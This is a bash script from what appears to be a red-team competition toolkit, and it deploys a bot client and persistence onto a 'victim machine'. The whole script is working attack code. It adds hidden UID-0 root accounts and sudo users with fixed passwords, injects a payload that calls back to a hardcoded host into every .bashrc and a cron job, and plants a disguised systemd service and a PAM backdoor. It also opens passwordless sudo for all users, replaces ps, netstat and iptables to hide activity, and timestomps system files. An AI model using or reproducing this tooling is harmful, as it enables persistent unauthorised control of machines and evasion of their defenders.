#!/bin/bash

#
#   Author: Sunggwan Choi 
#   
#   Description: deploy.sh will deploy the client.py(bot) agent to the victim 
#   machie. After that, deploy.sh will deploy various persistence payloads 
#   in order to establish persistence. 
#
#
#
#   TODO: Need to stop hardcoding. Less spaghetti in the code.
#   the code is NOT scalable at all, need to work on that. 
#

# Change host and port before the deployment 
host="192.168.204.128"
port="8080"


payload1="/dev/shm/pulse-shm-401862937 $host $port" 
payload2="/dev/loop17 $host $port"
payload3="/etc/vmwaretools.conf $host $port"

# Setup tools for basic deployment 
setup(){
    yum install -y gcc make vim python3 curl wget openssh-server build-essential
    apt-get -qq install -y gcc curl wget vim python3 openssh-server build-essential
    systemctl start ssh 
    systemctl enable ssh 
}

backdoor_users(){
    echo -e "\nCreating Backdoor users....\n"

    # fake root users 
    sed -is "3 a sbin:x:0:0:root:/root:/bin/bash" /etc/passwd 
    sed -is "6 a bakup:x:0:0:root:/root:/bin/bash" /etc/passwd 
    sed -is "11 a ucp:x:0:0:root:/root:/bin/bash" /etc/passwd 

    echo -e "password\npassword" | passwd sbin 
    echo -e "password\npassword" | passwd bakup
    echo -e "password\npassword" | passwd ucp

    # Normal users
    groupadd -g 135 whiteteamer
    groupadd -g 136 scoring
    groupadd -g 137 scoringengine
    useradd -u 135 -g 135 -M whiteteamer -s /bin/bash
    useradd -u 136 -g 136 -M scoring -s /bin/bash
    useradd -u 137 -g 137 -M scoringengine -s /bin/bash 
    useradd -M backdoor -s /bin/bash 
    useradd -M bakdoor -s /bin/bash 

    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd whiteteamer 
    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd scoring 
    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd scoringengine 
    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd backdoor 
    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd bakdoor 

    usermod -aG sudo whiteteamer
    usermod -aG sudo scoring
    usermod -aG sudo scoringengine
    usermod -aG sudo backdoor
    usermod -aG sudo bakdoor

    # For CentOS love 
    usermod -aG wheel whiteteamer
    usermod -aG wheel scoring
    usermod -aG wheel scoringengine
    usermod -aG wheel backdoor
    usermod -aG wheel bakdoor
}

# Clone the client binary into different places 
clone(){
    echo -e "\nCloning all the files to the right directory...\n"

    cp deploy.sh /dev/shm/pulse-shm-10175238
    cp deploy.sh /dev/loop28
    cp deploy.sh /etc/vmware-tools.conf 

    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/shm/pulse-shm-401862937
    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
    cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf 

}

# Create a service which overwrites sshd_config, sudoers, pam
# every 5 seconds. The service will run "copy", which is the bash
# script that actually does this. 
copyman(){
    echo -e "\n Installing copyman service...\n"
    # Clone copyman and its files 
    mkdir -p /lib/modules/kernel_static

    cp /opt/cdt-redteamtool/payload/static/vmware-network.service /etc/systemd/system/vmware-network.service
    cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
    cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
    chmod 744 /etc/systemd/system/vmware-network.service
    chmod +x /lib/modules/kernel_static/copy

    systemctl daemon-reload
    systemctl start vmware-network
    systemctl enable vmware-network
}

# Add bot payload to all the bashrc found in /home and /root 
bashrc(){
    echo -e "\nChanging all bashrc... \n"

    bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
    for i in $bashrc; do
        sed -is "30 a $payload1 2>/dev/null &" $i
        sed -is "31 a disown $!" $i
    done

    sed -i "30 a $payload1 2>/dev/null &" /root/.bashrc
    sed -i "31 a disown $!" /root/.bashrc
    sed -i "16 a chmod 777 /etc/passwd /etc/shadow"
}

# Need persistent alias. Right now, this doesn't do anything 
alias_ls(){
    alias ls="ls; $payload2"
}

# Add a cronjob with bot payload which runs every 1 minute
# This is a bad idea as it gives away IP and port. 
cronjob(){
    echo -e "\nInstalling cronjob... \n"

    crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
    systemctl restart cron 
    systemctl restart crond

    systemctl enable cron
    systemctl enable crond 
}

# Shim iptables. IPtables had weird symlink, had to separate it 
shim_iptables(){
    echo -e "\nShimming iptables... \n"

    gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o /opt/cdt-redteamtool/payload/iptables/drop
    cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
    cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
    chmod 755 /sbin/xtables-single

    xtables=`which iptables`
    ln -sf /sbin/xtables-single $xtables

    # Linux capabilities are fun!! 
    setcap CAP_NET_RAW,CAP_NET_ADMIN+ep /sbin/xtables-multi
    setcap CAP_NET_RAW,CAP_NET_ADMIN+ep /sbin/xtables-single

}

shim_ps(){
    echo -e "\nShimming ps... \n"

    gcc /opt/cdt-redteamtool/payload/ps/drop_ps.c -o /bin/procs
    chmod 755 /bin/procs
    mv /bin/ps /var/cache/ps
    cp /opt/cdt-redteamtool/payload/ps/ps /bin/ps
    chmod 755 /bin/ps
}


# Need to add a shim for netstat 
shim_netstat() {
	echo -e "\nShimming netstat... \n"

	gcc /opt/cdt-redteamtool/payload/netstat/drop_netstat.c -o /bin/vmwareps
	chmod 755 /bin/vmwareps

	mv /bin/netstat /var/cache/netstat 
	mv /usr/bin/netstat /var/cache/netstat 

	cp /opt/cdt-redteamtool/payload/netstat/netstat /usr/bin/netstat 
	cp /opt/cdt-redteamtool/payload/netstat/netstat /bin/netstat 

	chmod 755 /bin/netstat 
	chmod 755 /usr/bin/netstat 
}

# PAM backdoor 
pam(){
    cp /opt/cdt-redteamtool/payload/static/common-auth /etc/pam.d/common-auth
}

# vulnerable sshd_config 
# think about ForceCommand --> iptable drop + run client 
sshd_config(){
    cp /opt/cdt-redteamtool/payload/static/sshd_config /etc/ssh/sshd_config
    systemctl restart ssh
}

# vulnerable bashrc (POG) ? 

# vulnerable sudoers
sudoers(){
    echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
}


# Timestomp 
timestomp(){
    find -print | while read filename; do
    # do whatever you want with the file
    touch -t 201910251920 "$filename"
done
}


########## Start of Main ##########

mkdir -p /var/cache

setup
backdoor_users
copyman
clone
sshd_config
sudoers
cronjob
pam
bashrc  
shim_iptables
shim_ps
shim_netstat

systemctl daemon-reload 

# Time Stomping starts
cd /etc
timestomp

cd /home
timestomp

cd /bin
timestomp

cd /var/cache
timestomp

cd /var
timestomp


echo -e "========= Script have ended. Erase all artifaces in /opt ========== \n"
